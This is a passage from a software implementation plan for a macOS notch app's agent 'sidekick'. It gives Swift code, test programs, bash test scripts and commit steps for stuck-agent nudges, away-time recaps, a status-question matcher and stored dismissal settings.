                if let due, due > now, out.nextAt == nil || due < out.nextAt! { out.nextAt = due }
            }
        }
        if let best {
            let kind = kinds[best.rank]
            out.nudge = SKNudge(kind: kind, reasonId: String(kind.dropFirst(6)), key: best.s.key, agentId: best.s.agentId)
        }
        return out
    }

    /// The ledger with that session marked as nudged: it gets no second nudge.
    static func markNudged(_ ledger: SKLedger, key: String, now: Double) -> SKLedger {
        SKLedger(sessions: ledger.sessions.map { s in var c = s; if s.key == key { c.nudgedAt = now }; return c })
    }

    /// The words of a nudge: a fixed template with the agent's name and a whole number of minutes. The waiting line switches to the terminal line once the platform's give-up time has passed.
    static func text(_ nudge: SKNudge, _ ledger: SKLedger, now: Double, platform: String = "mac") -> String {
        let s = ledger.sessions.first { $0.key == nudge.key }
        let agent = SK.agentName(nudge.agentId)
        switch nudge.kind {
        case "stuck.loop": return "\(agent) has run the same step \(loopSame) times."
        case "stuck.errors": return "\(agent) hit \(errors) errors in a row."
        case "stuck.waiting":
            let giveUp = giveUpMs[platform] ?? giveUpMs["mac"]!
            if let s, let at = s.pendingApprovalAt, now - at >= giveUp { return "\(agent) is waiting for your OK in the terminal." }
            return "\(agent) is still waiting for your OK."
        case "stuck.silent": return "\(agent) has been quiet for \(s.map { Int(((now - $0.lastEventAt) / SK.minute).rounded(.down)) } ?? 0) minutes."
        default: return ""
        }
    }
}
```

- [ ] **Step 4: Run the test to make it pass**

Run: `bash scripts/test-sidekick-stuck.sh`
Expected: PASS. `stuckStep: 40 timelines`, `every probe gives the fixture's answer (68 probes)`, 15 `✓` lines in all, then `All tests passed.`

Bite it once: `sed -i '' 's/loopCalls = 8, loopSame = 4/loopCalls = 8, loopSame = 5/' NotchBuddy/Sources/App/SidekickStuck.swift && bash scripts/test-sidekick-stuck.sh 2>&1 | grep -E "✗|failed"`. Expected: `✗ loop: 4 of the last 8 calls`, `✗ every probe gives the fixture's answer (68 probes)` followed by a number of differences, and `2 test(s) failed.` Undo it with `sed -i '' 's/loopCalls = 8, loopSame = 5/loopCalls = 8, loopSame = 4/' NotchBuddy/Sources/App/SidekickStuck.swift` and run the test again.

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): the stuck rules, from stuck-cases.json

Loop, errors, waiting and silent, one nudge per session, and the earliest deadline for the one one-shot timer (none while nothing is live).

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickStuck.swift tests/SidekickStuckTests.swift scripts/test-sidekick-stuck.sh
git commit -F "$MSG"
```

---

### Task 4: The recap, the status answer and the status question

**Agent:** `nm-implementer-light` (Haiku 5.5, medium).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickRecap.swift`, `tests/SidekickRecapTests.swift`, `scripts/test-sidekick-recap.sh`

**Interfaces:**
- Consumes: Task 2's `SKSession`, `SKRing`, `SidekickLedger.ringMax`; Task 3's `SidekickStuck.silentMs`; Task 1's `SK`, `Rx`, `SidekickExplain.writeTools`; F1-0's `recapOf`, `statusOf` and `matchStatusQuestion` and `tests/fixtures/sidekick/recap-cases.json` (keys `min`, `cases` with `snapshot` and `recap`) and `status-cases.json` (keys `cases` with `snapshot`, `agent`, `status`; `matcher` with `text`, `matched`, `agentId`).
- Produces: `SKFacts` (`agent`, `agentId`, `project`, `steps`, `stepsAtLeast`, `files`, `more`, `errors`, `approvals`, `end`, `quietMinutes`, `json`), `SKLines` (`lines`, `facts`, `json`) and `SidekickRecap` (`minAwayMs`, `recap(awaySince:now:sessions:)`, `status(now:sessions:agent:)`, `matchStatusQuestion(_:)`). Tasks 7, 9, 14 and 17 read them.

A recap is what happened while the user was away; the status answer is the same sentences over everything the ledger holds. A line is a template filled with an agent's name, a project's basename, counts and at most three file basenames (`While you were away, Claude Code in proj ran 12 steps, edited a.js, b.js and c.js, and finished.`): never a command, a path or a word of the agent. `facts` is the same in numbers and names, and is the only thing the local voice may ever be given. A recap is `nil` when the user was away under two minutes or nothing happened in that time. The status question is matched only as a whole short message (`what's claude doing`, `status`, `what are the agents doing`); anything longer or different is a normal chat message and goes to the model.

- [ ] **Step 1: Write the failing test**

The program replays the 27 recap cases, the 12 status cases and the 31 messages of the matcher, and adds what the fixture cannot write (a time that is not finite, a named agent that is not running, no command key in a line or a fact).

**Create `tests/SidekickRecapTests.swift`**

```swift
import Foundation

// The recap, the status answer and the status question's matcher against tests/fixtures/sidekick/recap-cases.json and status-cases.json, and what the fixture cannot write (a time that is
// not finite, a marker planted in every input that must never reach a line or a fact). Run through scripts/test-sidekick-recap.sh.

@main
enum SidekickRecapTests {
    typealias R = SidekickRecap
    static func rows(_ x: Any?) -> [[String: Any]] { x as! [[String: Any]] }
    static func number(_ v: Any?) -> Double? { guard let n = v as? NSNumber, CFGetTypeID(n) != CFBooleanGetTypeID() else { return nil }; return n.doubleValue }
    static func sessions(_ snap: [String: Any]) -> [SKSession] { rows(snap["sessions"]).map(SKSession.init(json:)) }

    @MainActor static func main() {
        let rx = CT.fixture("recap-cases.json", dir: "sidekick"), st = CT.fixture("status-cases.json", dir: "sidekick")

        CT.section("the frozen numbers")
        CT.check("a recap needs two minutes away", R.minAwayMs, number(rx["min"])!)

        let recaps = rows(rx["cases"])
        CT.section("recapOf: \(recaps.count) cases, the lines and the facts each one gives (or nothing)")
        var diffs: [String] = []
        for c in recaps {
            let snap = c["snapshot"] as! [String: Any]
            let got = R.recap(awaySince: number(snap["awaySince"])!, now: number(snap["now"])!, sessions: sessions(snap))
            let d = CT.diffs(got?.json ?? NSNull(), c["recap"] ?? NSNull())
            if !d.isEmpty { diffs.append("\(c["name"] as! String): \(d.first!)") }
        }
        CT.checkRows("every recap is the fixture's", diffs)

        let statuses = rows(st["cases"])
        CT.section("statusOf: \(statuses.count) cases")
        diffs = []
        for c in statuses {
            let snap = c["snapshot"] as! [String: Any]
            let got = R.status(now: number(snap["now"])!, sessions: sessions(snap), agent: c["agent"] as? String)
            let d = CT.diffs(got.json, c["status"]!)
            if !d.isEmpty { diffs.append("\(c["name"] as! String): \(d.first!)") }
        }
        CT.checkRows("every status is the fixture's", diffs)

        let matcher = rows(st["matcher"])
        CT.section("matchStatusQuestion: \(matcher.count) messages")
        diffs = []
        for m in matcher {
            let got = R.matchStatusQuestion(m["text"] as! String)
            if got.matched != (m["matched"] as! Bool) || got.agentId != (m["agentId"] as? String) { diffs.append("\(m["text"] as! String): \(got), want \(m["matched"] ?? "?") \(m["agentId"] ?? "nil")") }
        }
        CT.checkRows("a whole short message is the question, anything else is a normal message", diffs)

        CT.section("what the fixture cannot write")
        CT.check("a time that is not finite gives no recap", R.recap(awaySince: .nan, now: 5_000_000, sessions: []) == nil && R.recap(awaySince: 0, now: .infinity, sessions: []) == nil, true)
        CT.check("nothing is running, and the answer says so, with a time that is not finite too", [R.status(now: .nan, sessions: []).lines, R.status(now: 5, sessions: []).lines], [["No agent is running right now."], ["No agent is running right now."]])
        CT.check("a named agent that is not running", R.status(now: 5, sessions: [], agent: "agent_codex").lines, ["Codex is not running right now."])
        var s = SKSession(key: "integration_claude|S", agentId: "integration_claude", sessionId: "S", startedAt: 0, lastEventAt: 10_000)
        s.project = "proj"; s.state = "working"
        s.ring = [SKRing(at: 5000, kind: "tool", tool: "Edit", target: "a.js", file: "a.js", key: "Edit#1", ok: true), SKRing(at: 6000, kind: "tool", tool: "Bash", target: "Bash#2", file: "", key: "Bash#2", ok: true)]
        let out = R.recap(awaySince: 0, now: 500_000, sessions: [s])!
        let text = (out.lines + out.facts.map { "\($0.json)" }).joined(separator: "\n")
        CT.check("the recap holds a basename and a count, never a command key", [text.contains("Edit#1"), text.contains("Bash#2")], [false, false])
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-recap.sh`**

```bash
#!/usr/bin/env bash
# Sidekick recap, status answer and status question (recapOf, statusOf, matchStatusQuestion): tests/fixtures/sidekick/recap-cases.json and status-cases.json, and what they cannot write.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-recap.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs

APP=NotchBuddy/Sources/App
swiftc -swift-version 6 \
    $APP/SidekickText.swift $APP/SidekickExplain.swift $APP/SidekickLedger.swift $APP/SidekickStuck.swift $APP/SidekickRecap.swift \
    tests/CatTestSupport.swift tests/SidekickRecapTests.swift \
    -o "$TEST_DIR/sidekick-recap-tests"
"$TEST_DIR/sidekick-recap-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-recap.sh`

- [ ] **Step 2: Run the test to make it fail**

Run: `bash scripts/test-sidekick-recap.sh`
Expected: FAIL. `error opening input file` for `SidekickRecap.swift`.

- [ ] **Step 3: Write the templates**

**Create `NotchBuddy/Sources/App/SidekickRecap.swift`**

```swift
import Foundation

// What happened while the user was away, and what the agents are doing now, in fixed sentences. Port of `recapOf`, `statusOf` and `matchStatusQuestion` in `shared/sidekick-core.js` (the
// tie-breaker); tests/fixtures/sidekick/recap-cases.json and status-cases.json pin them and docs/SIDEKICK-CONTRACT.md explains them. A line is a template filled with an agent's
// name, a project's basename, counts and up to three file basenames: never a command, a path or a word of the agent. `facts` is the same in numbers and names, and is the only thing the
// local voice may be given. Pure Foundation.

struct SKFacts: Equatable, Sendable {
    var agent: String
    var agentId: String
    var project: String
    var steps: Int
    var stepsAtLeast: Bool
    var files: [String]
    var more: Int
    var errors: Int
    var approvals: Int
    /// finished, waiting, error, question, quiet or working.
    var end: String
    var quietMinutes: Int

    var json: [String: Any] {
        ["agent": agent, "agentId": agentId, "project": project, "steps": steps, "stepsAtLeast": stepsAtLeast, "files": files, "more": more, "errors": errors, "approvals": approvals, "end": end, "quietMinutes": quietMinutes]
    }
}

struct SKLines: Equatable, Sendable {
    var lines: [String]
    var facts: [SKFacts]
    var json: [String: Any] { ["lines": lines, "facts": facts.map(\.json)] }
}

enum SidekickRecap {
    static let minAwayMs = 2 * SK.minute, maxLines = 3, maxFiles = 3, statusFinishedMs = 10 * SK.minute
    private static let active: Set<String> = ["thinking", "working", "searching"]
    private static let writeSet = SidekickExplain.writeTools.union(["apply_patch"])

    private static func plural(_ n: Int, _ one: String, _ many: String) -> String { "\(n) \(n == 1 ? one : many)" }
    private static func isCall(_ r: SKRing) -> Bool { r.kind == "tool" || r.kind == "failure" }

    /// How a session stands now: finished, waiting (for an OK), question, error, quiet (active, with nothing heard for 5 minutes) or working.
    private static func endOf(_ s: SKSession, now: Double) -> String {
        if s.state == "approval" && s.pendingApprovalAt != nil { return "waiting" }
        if s.state == "question" { return "question" }
        if s.state == "error" { return "error" }
        if s.state == "finished" { return "finished" }
        return active.contains(s.state) && now - s.lastEventAt >= SidekickStuck.silentMs ? "quiet" : "working"
    }

    /// What one agent did since `since` (ms; 0 for everything the ledger holds), over all its sessions: counts, up to three file names, and how it stands.
    private static func factsOf(_ sessions: [SKSession], since: Double, now: Double) -> (facts: SKFacts, lastEventAt: Double) {
        let entries = sessions.flatMap { $0.ring.filter { $0.at >= since } }
        var files: [String] = []
        for r in entries where r.kind == "tool" && r.ok && writeSet.contains(r.tool) && !r.file.isEmpty && !files.contains(r.file) { files.append(r.file) }
        var rep = sessions[0]
        for s in sessions.dropFirst() where s.lastEventAt > rep.lastEventAt { rep = s }
        let end = endOf(rep, now: now)
        let atLeast = sessions.contains { $0.ring.count >= SidekickLedger.ringMax && $0.ring[0].at >= since }
        let f = SKFacts(agent: SK.agentName(rep.agentId), agentId: rep.agentId, project: rep.project, steps: entries.filter(isCall).count, stepsAtLeast: atLeast,
                        files: Array(files.prefix(maxFiles)), more: max(0, files.count - maxFiles), errors: entries.filter { $0.kind == "failure" }.count,
                        approvals: entries.filter { $0.kind == "approvalAsked" }.count, end: end, quietMinutes: end == "quiet" ? Int(((now - rep.lastEventAt) / SK.minute).rounded(.down)) : 0)
        return (f, rep.lastEventAt)
    }

    private static func nameList(_ f: SKFacts) -> String {
        if f.more > 0 { return "\(f.files.joined(separator: ", ")) and \(f.more) more" }
        if f.files.count > 1 { return "\(f.files.dropLast().joined(separator: ", ")) and \(f.files.last!)" }
        return f.files.first ?? ""
    }

    private static let tail = ["finished": "finished", "waiting": "is waiting for your OK", "error": "stopped on an error", "question": "is waiting for your answer", "working": "is still working"]

    /// The rest of a line after the subject: what it ran, in brackets what went wrong or was asked, the files it edited, and how it stands.
    private static func lineBody(_ f: SKFacts, has: String) -> String {
        let subject = f.project.isEmpty ? f.agent : "\(f.agent) in \(f.project)"
        let end = f.end == "quiet" ? "has been quiet for \(plural(f.quietMinutes, "minute", "minutes"))" : tail[f.end] ?? ""
        if f.steps == 0 && f.approvals == 0 { return "\(subject) \(end)." }
        let did = f.steps > 0 ? "\(has)\(f.stepsAtLeast ? "\(SidekickLedger.ringMax) or more steps" : plural(f.steps, "step", "steps"))" : "asked for \(plural(f.approvals, "approval", "approvals"))"
        var counts: [String] = []
        if f.errors > 0 { counts.append(plural(f.errors, "error", "errors")) }
        if f.steps > 0 && f.approvals > 0 { counts.append("\(plural(f.approvals, "approval", "approvals")) asked") }
        let edited = f.files.isEmpty ? "" : ", edited \(nameList(f))"
        return "\(subject) \(did)\(counts.isEmpty ? "" : " (\(counts.joined(separator: ", ")))")\(edited)\(edited.isEmpty ? "" : ",") and \(end)."
    }

    /// Groups sessions by agent, the agent that spoke last first, and writes at most three lines, then "+N more".
    private static func linesOf(_ groups: [[SKSession]], prefix: String, has: String, now: Double, since: Double) -> SKLines {
        let facts = groups.map { factsOf($0, since: since, now: now) }.sorted { $0.lastEventAt != $1.lastEventAt ? $0.lastEventAt > $1.lastEventAt : $0.facts.agentId < $1.facts.agentId }
        var lines = facts.prefix(maxLines).map { prefix + lineBody($0.facts, has: has) }
        if facts.count > maxLines { lines.append("+\(facts.count - maxLines) more") }
        return SKLines(lines: lines, facts: facts.map(\.facts))
    }

    private static func byAgent(_ sessions: [SKSession]) -> [[SKSession]] {
        var order: [String] = [], m: [String: [SKSession]] = [:]
        for s in sessions { if m[s.agentId] == nil { order.append(s.agentId) }; m[s.agentId, default: []].append(s) }
        return order.map { m[$0]! }
    }

    /// What happened while the user was away, or nil when the away time was under two minutes or no agent did anything in it (a recap is never "nothing happened"). It looks only at ring entries at or after `awaySince`.
    static func recap(awaySince: Double, now: Double, sessions: [SKSession]) -> SKLines? {
        guard awaySince.isFinite, now.isFinite, now - awaySince >= minAwayMs else { return nil }
        let groups = byAgent(sessions).map { $0.filter { s in s.ring.contains { $0.at >= awaySince } } }.filter { !$0.isEmpty }
        if groups.isEmpty { return nil }
        return linesOf(groups, prefix: "While you were away, ", has: "ran ", now: now, since: awaySince)
    }

    /// The answer to "What's Claude doing?": the same templates over everything the ledger holds, for the live sessions (a finished one for 10 minutes), or for one agent.
    static func status(now: Double, sessions: [SKSession], agent: String? = nil) -> SKLines {
        let named = agent.flatMap { $0.isEmpty ? nil : $0 }
        let none = SKLines(lines: [named.map { "\(SK.agentName($0)) is not running right now." } ?? "No agent is running right now."], facts: [])
        guard now.isFinite else { return none }
        let live = sessions.filter { s in s.endedAt == nil && (s.state != "finished" || now - s.lastEventAt <= statusFinishedMs) && (agent == nil || agent!.isEmpty || s.agentId == agent) }
        if live.isEmpty { return none }
        return linesOf(byAgent(live), prefix: "", has: "has run ", now: now, since: 0)
    }

    private static let agents = ["claude": "integration_claude", "claude code": "integration_claude", "codex": "agent_codex", "gemini": "agent_gemini", "gemini cli": "agent_gemini", "antigravity": "agent_antigravity", "cursor": "agent_cursor"]
    private static let everyone: Set<String> = ["the agents", "my agents", "the agent", "my agent", "everyone", "everybody"]

    /// Is this message the status question? It must be the whole message: a short text that, lower-cased and stripped of punctuation, is "what's claude doing", "what is codex doing",
    /// "what are the agents doing" or "status" (with an optional agent name and an optional "right now"). Anything longer or different is a normal chat message.
    /// `agentId` is nil for "all of them".
    static func matchStatusQuestion(_ text: String) -> (matched: Bool, agentId: String?) {
        guard text.utf16.count <= 80 else { return (false, nil) }
        var t = text.lowercased()
        t = t.replacingOccurrences(of: "[\u{2018}\u{2019}\u{02BC}']", with: "", options: .regularExpression)
        t = t.replacingOccurrences(of: "[^a-z0-9 ]+", with: " ", options: .regularExpression)
        t = t.replacingOccurrences(of: "\\s+", with: " ", options: .regularExpression).trimmingCharacters(in: .whitespacesAndNewlines)
        t = t.replacingOccurrences(of: " (right )?now\\z", with: "", options: .regularExpression)
        if t == "status" || t == "agent status" || t == "agents status" { return (true, nil) }
        if let m = Rx.groups("^(?:whats|what is) (.+?) doing\\z", t) ?? Rx.groups("^what (?:are|is) (.+?) doing\\z", t), let who = m[1] {
            if let id = agents[who] { return (true, id) }
            if everyone.contains(who) { return (true, nil) }
            return (false, nil)
        }
        if let m = Rx.groups("^(.+) status\\z", t), let who = m[1], let id = agents[who] { return (true, id) }
        return (false, nil)
    }
}
```

- [ ] **Step 4: Run the test to make it pass**

Run: `bash scripts/test-sidekick-recap.sh`
Expected: PASS. `recapOf: 27 cases`, `statusOf: 12 cases`, `matchStatusQuestion: 31 messages`, 8 `✓` lines in all, then `All tests passed.`

Bite it once: `sed -i '' 's/maxLines = 3, maxFiles = 3/maxLines = 3, maxFiles = 2/' NotchBuddy/Sources/App/SidekickRecap.swift && bash scripts/test-sidekick-recap.sh 2>&1 | grep -E "✗|failed"`. Expected: `✗ every recap is the fixture's` (with a number of differences) and `1 test(s) failed.` Undo it with the reverse `sed` and run the test again.

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): the recap, the status answer and the status question, from recap-cases.json and status-cases.json

Fixed templates filled with an agent's name, a project's basename, counts and up to three file basenames; the matcher takes only a whole short message.

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickRecap.swift tests/SidekickRecapTests.swift scripts/test-sidekick-recap.sh
git commit -F "$MSG"
```

---

### Task 5: Dismissals, the stored settings and the store

**Agent:** `nm-implementer-light` (Haiku 5.5, medium).

**Files:**
- Create: `NotchBuddy/Sources/App/SidekickSettings.swift`, `NotchBuddy/Sources/App/SidekickStore.swift`, `tests/SidekickSettingsTests.swift`, `scripts/test-sidekick-settings.sh`

**Interfaces:**
- Consumes: A's `CatSettingsBacking` (`CatSettings.swift`), `tests/CatSettingsSupport.swift` (`MemoryBacking`), F1-0's `dismiss`, `muted`, `unmute` and `cleanSidekickSettings` and `tests/fixtures/sidekick/dismiss-cases.json` (keys `kinds`, `muteAt`, `cases` with `start`, `ops` and `trail`) and `settings-cases.json` (keys `kinds`, `cases` with `raw` and `clean`).
- Produces: `SidekickSettings` (`kinds`, `muteAt`, `on`, `local`, `dismissals`, `cleanCount`, `cleanDismissals`, `clean(_:)`, `json`, `dismissed(_:)`, `isMuted(_:)`, `mutedKinds`, `unmuted(_:)`, `withOn`, `withLocal`, `Key`, `load(from:)`, `dismissalsText`, `save(to:replacing:)`) and `SidekickStore` (`shared`, `settings`, `update`, `setOn`, `setLocal`, `dismiss`, `unmute`). Tasks 6, 9, 10 and 15 read them.

What the sidekick saves: the master switch ("Recaps and nudges", on by default), the local-voice switch (on by default) and how many times each of the five kinds of note (`recap`, `stuck.loop`, `stuck.errors`, `stuck.waiting`, `stuck.silent`; frozen, like the cat IDs) was dismissed. A click on Not now, OK or × is a dismissal; folding the island unseen is not. Two dismissals mute a kind; Unmute sets it back to 0. The risk badge and the permission line are not a kind and are never muted. The UserDefaults keys are `sidekick.on` and `sidekick.local` (Bools) and `sidekick.dismissals` (the JSON text of kind to count). Everything read back goes through `SidekickSettings.clean`: a switch is on unless it is exactly the boolean `false` (the text `"false"` and the number `0` leave it on), a count is a whole number from 1 to 2 (anything else is 0), an unknown kind is dropped, text that is not JSON is no dismissals. It is a clean-up of its own: no existing settings fixture or test changes.

- [ ] **Step 1: Write the failing test**

The program replays the 9 dismissal cases and the 17 stored values (cleaning twice is cleaning once), pins the three keys, and runs the store on a dictionary (`MemoryBacking`, never `UserDefaults`): a first save writes the three keys, a save writes only what changed, a hand-edited store loads as the defaults, a change that changes nothing writes nothing.

**Create `tests/SidekickSettingsTests.swift`**

```swift
import Foundation

// The dismissal memory and the stored settings against tests/fixtures/sidekick/dismiss-cases.json and settings-cases.json, and what the fixture cannot write: the UserDefaults keys, what a
// hand-edited preferences file loads as, and that a save writes only what changed. Run through scripts/test-sidekick-settings.sh.

@main
enum SidekickSettingsTests {
    typealias S = SidekickSettings
    static func rows(_ x: Any?) -> [[String: Any]] { x as! [[String: Any]] }

    @MainActor static func main() {
        let dx = CT.fixture("dismiss-cases.json", dir: "sidekick"), sx = CT.fixture("settings-cases.json", dir: "sidekick")

        CT.section("the frozen kinds")
        CT.check("the five kinds, in order", S.kinds, dx["kinds"] as! [String])
        CT.check("two dismissals mute a kind", S.muteAt, (dx["muteAt"] as! NSNumber).intValue)
        CT.check("the same kinds in the settings fixture", S.kinds, sx["kinds"] as! [String])

        let cases = rows(dx["cases"])
        CT.section("dismiss, unmute and muted: \(cases.count) cases, the state and the muted kinds after every step")
        var diffs: [String] = []
        for c in cases {
            var s = SidekickSettings(on: true, local: true, dismissals: S.cleanDismissals(c["start"]))
            for (i, op) in rows(c["ops"]).enumerated() {
                let kind = op["kind"] as? String ?? "\u{0}"   // a kind that is not text is no kind
                s = (op["op"] as! String) == "dismiss" ? s.dismissed(kind) : s.unmuted(kind)
                let want = rows(c["trail"])[i]
                let d = CT.diffs(s.dismissals, want["state"]!) + CT.diffs(s.mutedKinds, want["muted"]!)
                if !d.isEmpty { diffs.append("\(c["name"] as! String) step \(i): \(d.first!)") }
            }
        }
        CT.checkRows("every step is the fixture's", diffs)

        let cleans = rows(sx["cases"])
        CT.section("SidekickSettings.clean: \(cleans.count) stored values, the clean value each one becomes")
        diffs = []
        for c in cleans {
            let got = S.clean(c["raw"])
            let d = CT.diffs(got.json, c["clean"]!)
            if !d.isEmpty { diffs.append("\(c["name"] as! String): \(d.first!)") }
            if S.clean(got.json) != got { diffs.append("\(c["name"] as! String): cleaning twice is not cleaning once") }
        }
        CT.checkRows("every raw value cleans to the fixture's, and cleaning twice is cleaning once", diffs)

        CT.section("the UserDefaults keys")
        CT.check("the three keys", [S.Key.on, S.Key.local, S.Key.dismissals], ["sidekick.on", "sidekick.local", "sidekick.dismissals"])
        let mem = MemoryBacking()
        CT.check("nothing stored: everything on, nothing dismissed", S.load(from: mem), SidekickSettings())
        let muted = SidekickSettings().dismissed("recap").dismissed("recap").dismissed("stuck.loop").withOn(false)
        muted.save(to: mem)
        CT.check("a first save writes the three keys", mem.writes, [S.Key.on, S.Key.local, S.Key.dismissals])
        CT.check("the dismissals are stored as sorted JSON text", mem.values[S.Key.dismissals] as? String, #"{"recap":2,"stuck.errors":0,"stuck.loop":1,"stuck.silent":0,"stuck.waiting":0}"#)
        CT.check("and load back the same", S.load(from: mem), muted)
        let before = mem.writes.count
        muted.unmuted("recap").save(to: mem, replacing: muted)
        CT.check("a save writes only what changed", Array(mem.writes.dropFirst(before)), [S.Key.dismissals])
        let hand = MemoryBacking()
        hand.values = [S.Key.on: "false", S.Key.local: 0, S.Key.dismissals: "{not json"]
        CT.check("a hand-edited store loads as the defaults, never a throw", S.load(from: hand), SidekickSettings())
        hand.values[S.Key.on] = false
        hand.values[S.Key.dismissals] = #"{"recap":5,"stuck.silent":-1,"bogus":2}"#
        CT.check("a switch that is the boolean false is off, a count above 2 is 2, a bad count and an unknown kind go", S.load(from: hand), SidekickSettings(on: false, local: true, dismissals: ["recap": 2, "stuck.loop": 0, "stuck.errors": 0, "stuck.waiting": 0, "stuck.silent": 0]))
        CT.check("an unknown kind changes nothing", SidekickSettings().dismissed("stuck.sleepy").unmuted("constructor"), SidekickSettings())

        CT.section("the store: the app's one holder")
        let backing = MemoryBacking()
        let store = SidekickStore(backing: backing)
        CT.check("it starts from what is stored: the defaults", store.settings, SidekickSettings())
        store.setOn(false)
        store.setLocal(false)
        CT.check("the two switches are saved", [backing.values[S.Key.on] as? Bool, backing.values[S.Key.local] as? Bool], [false, false])
        store.dismiss("recap"); store.dismiss("recap"); store.dismiss("stuck.silent")
        CT.check("two dismissals mute a kind, one does not", store.settings.mutedKinds, ["recap"])
        CT.check("and they are saved as text", backing.values[S.Key.dismissals] as? String, #"{"recap":2,"stuck.errors":0,"stuck.loop":0,"stuck.silent":1,"stuck.waiting":0}"#)
        let writes = backing.writes.count
        store.setOn(false)
        store.dismiss("nonsense")
        CT.check("a change that changes nothing writes nothing", backing.writes.count, writes)
        store.unmute("recap")
        CT.check("Unmute sets a kind back to zero", store.settings.mutedKinds, [])
        CT.check("a second store on the same backing sees it all", SidekickStore(backing: backing).settings, store.settings)
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-settings.sh`**

```bash
#!/usr/bin/env bash
# Sidekick dismissal memory and stored settings (dismiss, unmute, SidekickSettings.clean, the UserDefaults keys): dismiss-cases.json and settings-cases.json, and what they cannot write.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-settings.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs

APP=NotchBuddy/Sources/App
swiftc -swift-version 6 \
    $APP/CatMath.swift $APP/CatPresets.swift $APP/CatGeometry.swift $APP/Personality.swift $APP/CatRules.swift $APP/CatSettings.swift $APP/SidekickSettings.swift $APP/SidekickStore.swift \
    tests/CatTestSupport.swift tests/CatSettingsSupport.swift tests/SidekickSettingsTests.swift \
    -o "$TEST_DIR/sidekick-settings-tests"
"$TEST_DIR/sidekick-settings-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-settings.sh`

- [ ] **Step 2: Run the test to make it fail**

Run: `bash scripts/test-sidekick-settings.sh`
Expected: FAIL. `error opening input file` for `SidekickSettings.swift` and `SidekickStore.swift`.

- [ ] **Step 3: Write the clean-up and the store**

**Create `NotchBuddy/Sources/App/SidekickSettings.swift`**

```swift
import Foundation

// What the sidekick saves, and how it is cleaned: the master switch ("Recaps and nudges"), the local-voice switch, and how many times each kind of note was dismissed. Port of `dismiss`,
// `muted`, `unmute` and `cleanSidekickSettings` in `shared/sidekick-core.js` (the tie-breaker); tests/fixtures/sidekick/dismiss-cases.json and settings-cases.json pin them and
// docs/SIDEKICK-CONTRACT.md explains them. A click on Not now, OK or × is a dismissal; folding the island unseen is not (the app's call). Two dismissals mute a kind; Unmute in Settings sets
// it back to 0. The risk badge and the permission line are not a kind and are never muted. A preferences file can be hand-edited or half written, so everything read back goes through
// `SidekickSettings.clean`: raw in, clean out, never a throw. The UserDefaults keys are `sidekick.on` (a Bool), `sidekick.local` (a Bool) and `sidekick.dismissals` (the JSON text of kind to
// count). Foundation only.

struct SidekickSettings: Equatable, Sendable {
    /// The five kinds a note can be, in their frozen order. Each is dismissed and muted on its own.
    static let kinds = ["recap", "stuck.loop", "stuck.errors", "stuck.waiting", "stuck.silent"]
    static let muteAt = 2

    var on = true
    var local = true
    /// A count from 0 to 2 for every kind.
    var dismissals: [String: Int] = SidekickSettings.zeros

    static let zeros: [String: Int] = Dictionary(uniqueKeysWithValues: kinds.map { ($0, 0) })

    // MARK: Cleaning

    /// A stored count: a whole number from 1 to 2 stays (more is 2), anything else (text, a fraction, a negative, null, a boolean) is 0.
    static func cleanCount(_ v: Any?) -> Int {
        guard let n = v as? NSNumber, CFGetTypeID(n) != CFBooleanGetTypeID() else { return 0 }
        let d = n.doubleValue
        guard d.isFinite, d == d.rounded(), d > 0 else { return 0 }
        return d >= Double(muteAt) ? muteAt : Int(d)
    }

    /// The dismissals as they are kept: every kind once, each a count from 0 to 2. Unknown kinds go.
    static func cleanDismissals(_ raw: Any?) -> [String: Int] {
        let o = raw as? [String: Any] ?? [:]
        return Dictionary(uniqueKeysWithValues: kinds.map { ($0, cleanCount(o[$0])) })
    }

    /// A switch is on unless it is exactly the boolean false (the number 0 and the text "no" leave it on).
    private static func isOn(_ v: Any?) -> Bool {
        guard let n = v as? NSNumber, CFGetTypeID(n) == CFBooleanGetTypeID() else { return true }
        return n.boolValue
    }

    /// Everything the sidekick saves, cleaned. `raw` is a dictionary shaped like `{on, local, dismissals}`; anything else gives the defaults. Never throws; cleaning twice is cleaning once.
    static func clean(_ raw: Any?) -> SidekickSettings {
        let o = raw as? [String: Any] ?? [:]
        return SidekickSettings(on: isOn(o["on"]), local: isOn(o["local"]), dismissals: cleanDismissals(o["dismissals"]))
    }

    /// The settings as the fixtures hold them, a JSON-shaped dictionary.
    var json: [String: Any] { ["on": on, "local": local, "dismissals": dismissals] }

    // MARK: Dismissals

    /// One more dismissal of a kind (a click on Not now, OK or ×). A kind that is not one of the five changes nothing.
    func dismissed(_ kind: String) -> SidekickSettings {
        var s = self
        if Self.kinds.contains(kind) { s.dismissals[kind] = min(Self.muteAt, (s.dismissals[kind] ?? 0) + 1) }
        return s
    }

    /// A kind is muted once it has been dismissed twice. A muted kind never shows.
    func isMuted(_ kind: String) -> Bool { Self.kinds.contains(kind) && (dismissals[kind] ?? 0) >= Self.muteAt }

    /// The kinds that are muted now, in the frozen order (Settings lists them).
    var mutedKinds: [String] { Self.kinds.filter(isMuted) }

